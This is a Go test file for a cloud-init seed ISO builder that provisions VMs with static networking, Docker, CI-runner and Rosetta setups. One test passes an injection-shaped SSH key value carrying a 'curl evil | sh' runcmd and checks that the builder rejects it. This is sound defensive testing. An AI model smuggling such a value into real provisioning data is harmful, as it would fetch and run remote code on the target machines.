package cloudinit

import (
	"io"
	"os"
	"strings"
	"testing"

	"github.com/kdomanski/iso9660"

	"github.com/ForceAI-KW/umbra/internal/registry"
)

func TestBuildSeedProducesCidataISO(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t1", CPUs: 2, MemoryMiB: 2048, DiskGiB: 20, Image: "ubuntu:noble", IP: "192.168.127.10"}
	hosts := map[string]string{"t1": "192.168.127.10", "other": "192.168.127.11", "skipped": ""}
	iso, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra", hosts)
	if err != nil {
		t.Fatal(err)
	}
	f, err := os.Open(iso)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	img, err := iso9660.OpenImage(f)
	if err != nil {
		t.Fatal(err)
	}
	root, err := img.RootDir()
	if err != nil {
		t.Fatal(err)
	}
	children, err := root.GetChildren()
	if err != nil {
		t.Fatal(err)
	}
	found := map[string]string{}
	for _, c := range children {
		b, _ := io.ReadAll(c.Reader())
		found[c.Name()] = string(b)
	}
	ud, ok := found["user-data"]
	if !ok {
		t.Fatalf("no user-data in ISO; got %v", keys(found))
	}
	nc, ok := found["network-config"]
	if !ok {
		t.Fatalf("no network-config in ISO; got %v", keys(found))
	}
	for _, want := range []string{`addresses: [ "192.168.127.10/24" ]`, "via: \"192.168.127.1\"", "dhcp4: false"} {
		if !strings.Contains(nc, want) {
			t.Fatalf("network-config missing %q (static addressing):\n%s", want, nc)
		}
	}
	if strings.Contains(nc, "dhcp-identifier") {
		t.Fatalf("network-config still has dhcp-identifier (should be static, no DHCP):\n%s", nc)
	}
	for _, want := range []string{"#cloud-config", "ssh-ed25519 AAAATEST umbra", "name: umbra", "/mnt/mac", "virtiofs", "chrony", "local-hostname: t1"} {
		joined := ud + found["meta-data"]
		if !strings.Contains(joined, want) {
			t.Fatalf("seed missing %q", want)
		}
	}
	// hosts entries are appended to /etc/hosts via a printf runcmd (dash's
	// echo can't do -e); assert the printf line carries the IP + FQDN.
	for _, want := range []string{"192.168.127.11", ".umbra.local", "'other'", ">> /etc/hosts", "printf"} {
		if !strings.Contains(ud, want) {
			t.Fatalf("user-data missing hosts runcmd fragment %q:\n%s", want, ud)
		}
	}
	if strings.Contains(ud, "skipped.umbra.local") {
		t.Fatalf("user-data included hosts entry with empty IP:\n%s", ud)
	}
}

func TestBuildDockerSeed(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "docker", CPUs: 2, MemoryMiB: 2048, DiskGiB: 20, Image: "ubuntu:noble", IP: "192.168.127.20", Role: registry.ReservedDockerName}
	iso, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	ud := readISOFile(t, iso, "user-data")
	nc := readISOFile(t, iso, "network-config")

	for _, want := range []string{
		"get.docker.com",
		"tcp://0.0.0.0:2375",
		"--dport 2375 ! -s 192.168.127.1 -j DROP",
		"systemctl restart docker",
		"ssh-ed25519 AAAATEST umbra", // ssh key still present
	} {
		if !strings.Contains(ud, want) {
			t.Fatalf("docker user-data missing %q:\n%s", want, ud)
		}
	}
	if want := `addresses: [ "192.168.127.20/24" ]`; !strings.Contains(nc, want) { // static netplan still present
		t.Fatalf("docker network-config missing %q:\n%s", want, nc)
	}

	if n := strings.Count(ud, "runcmd:"); n != 1 {
		t.Fatalf("expected exactly one runcmd: key, got %d:\n%s", n, ud)
	}

	// A non-docker machine must not get any docker provisioning.
	dir2 := t.TempDir()
	m2 := &registry.Machine{Name: "t4", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble", IP: "192.168.127.21"}
	iso2, err := BuildSeed(m2, dir2, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	ud2 := readISOFile(t, iso2, "user-data")
	if strings.Contains(ud2, "get.docker.com") {
		t.Fatalf("non-docker machine's user-data unexpectedly contains docker provisioning:\n%s", ud2)
	}
}

func TestBuildCIRunnerSeed(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "fwb-ci2", CPUs: 4, MemoryMiB: 8192, DiskGiB: 60, Image: "ubuntu:noble", IP: "192.168.127.30", Role: registry.RoleCIRunner}
	iso, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	ud := readISOFile(t, iso, "user-data")
	nc := readISOFile(t, iso, "network-config")

	for _, want := range []string{
		"get.docker.com",
		"usermod -aG docker umbra",
		"systemctl restart docker",
		"ssh-ed25519 AAAATEST umbra", // ssh key still present
	} {
		if !strings.Contains(ud, want) {
			t.Fatalf("ci-runner user-data missing %q:\n%s", want, ud)
		}
	}
	for _, unwanted := range []string{"tcp://0.0.0.0:2375", "--dport 2375"} {
		if strings.Contains(ud, unwanted) {
			t.Fatalf("ci-runner user-data must not expose dockerd (%q found):\n%s", unwanted, ud)
		}
	}
	if want := `addresses: [ "192.168.127.30/24" ]`; !strings.Contains(nc, want) { // static netplan still present
		t.Fatalf("ci-runner network-config missing %q:\n%s", want, nc)
	}
	if n := strings.Count(ud, "runcmd:"); n != 1 {
		t.Fatalf("expected exactly one runcmd: key, got %d:\n%s", n, ud)
	}

	// A docker-role machine must still get the 2375 exposure (didn't break
	// the docker profile).
	dirDocker := t.TempDir()
	mDocker := &registry.Machine{Name: "docker", CPUs: 2, MemoryMiB: 2048, DiskGiB: 20, Image: "ubuntu:noble", IP: "192.168.127.31", Role: registry.ReservedDockerName}
	isoDocker, err := BuildSeed(mDocker, dirDocker, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	udDocker := readISOFile(t, isoDocker, "user-data")
	if !strings.Contains(udDocker, "2375") {
		t.Fatalf("docker-role user-data unexpectedly lost 2375 exposure:\n%s", udDocker)
	}

	// A normal machine (no role) must get neither profile.
	dirPlain := t.TempDir()
	mPlain := &registry.Machine{Name: "t5", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble", IP: "192.168.127.32"}
	isoPlain, err := BuildSeed(mPlain, dirPlain, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	udPlain := readISOFile(t, isoPlain, "user-data")
	if strings.Contains(udPlain, "get.docker.com") || strings.Contains(udPlain, "2375") {
		t.Fatalf("plain machine's user-data unexpectedly contains docker/ci-runner provisioning:\n%s", udPlain)
	}
}

func TestBuildDockerSeedHasRosetta(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "docker", CPUs: 2, MemoryMiB: 2048, DiskGiB: 20, Image: "ubuntu:noble", IP: "192.168.127.40", Role: registry.ReservedDockerName}
	iso, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	ud := readISOFile(t, iso, "user-data")

	for _, want := range []string{
		"vz-rosetta",
		"/mnt/rosetta",
		"binfmt_misc/register",
		"/mnt/rosetta/rosetta",
		`\x7fELF`,
		"OCF",
		"printf",
		// docker profile must still be present alongside the rosetta lines.
		"get.docker.com",
		"tcp://0.0.0.0:2375",
	} {
		if !strings.Contains(ud, want) {
			t.Fatalf("docker user-data missing %q:\n%s", want, ud)
		}
	}
	if strings.Contains(ud, "echo -e") {
		t.Fatalf("docker user-data uses echo -e instead of printf for binfmt registration:\n%s", ud)
	}
	if n := strings.Count(ud, "runcmd:"); n != 1 {
		t.Fatalf("expected exactly one runcmd: key, got %d:\n%s", n, ud)
	}

	// ci-runner role also gets the rosetta mount + binfmt.
	dirCI := t.TempDir()
	mCI := &registry.Machine{Name: "fwb-ci3", CPUs: 4, MemoryMiB: 8192, DiskGiB: 60, Image: "ubuntu:noble", IP: "192.168.127.41", Role: registry.RoleCIRunner}
	isoCI, err := BuildSeed(mCI, dirCI, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	udCI := readISOFile(t, isoCI, "user-data")
	for _, want := range []string{"vz-rosetta", "/mnt/rosetta", "binfmt_misc/register"} {
		if !strings.Contains(udCI, want) {
			t.Fatalf("ci-runner user-data missing %q:\n%s", want, udCI)
		}
	}
	if n := strings.Count(udCI, "runcmd:"); n != 1 {
		t.Fatalf("expected exactly one runcmd: key, got %d:\n%s", n, udCI)
	}

	// A normal (no-role) machine gets neither the rosetta mount nor binfmt.
	dirPlain := t.TempDir()
	mPlain := &registry.Machine{Name: "t6", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble", IP: "192.168.127.42"}
	isoPlain, err := BuildSeed(mPlain, dirPlain, "ssh-ed25519 AAAATEST umbra", nil)
	if err != nil {
		t.Fatal(err)
	}
	udPlain := readISOFile(t, isoPlain, "user-data")
	if strings.Contains(udPlain, "vz-rosetta") || strings.Contains(udPlain, "binfmt_misc") {
		t.Fatalf("plain machine's user-data unexpectedly contains rosetta provisioning:\n%s", udPlain)
	}
}

func readISOFile(t *testing.T, isoPath, name string) string {
	t.Helper()
	f, err := os.Open(isoPath)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	img, err := iso9660.OpenImage(f)
	if err != nil {
		t.Fatal(err)
	}
	root, err := img.RootDir()
	if err != nil {
		t.Fatal(err)
	}
	children, err := root.GetChildren()
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range children {
		if c.Name() == name {
			b, err := io.ReadAll(c.Reader())
			if err != nil {
				t.Fatal(err)
			}
			return string(b)
		}
	}
	t.Fatalf("no %s in ISO %s", name, isoPath)
	return ""
}

func keys(m map[string]string) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

func TestBuildSeedRejectsInjectionShapedKeys(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t2", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble", IP: "192.168.127.11"}
	for _, bad := range []string{
		"ssh-ed25519 AAAA umbra\nruncmd:\n  - curl evil | sh",
		"not-a-key AAAA",
		"ssh-ed25519 AAAA\r umbra",
	} {
		if _, err := BuildSeed(m, dir, bad, nil); err == nil {
			t.Fatalf("BuildSeed accepted injection-shaped key %q", bad)
		}
	}
}

func TestBuildSeedRequiresIP(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t3", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble"}
	if _, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra", nil); err == nil {
		t.Fatal("BuildSeed accepted a machine with no IP assigned")
	}
}
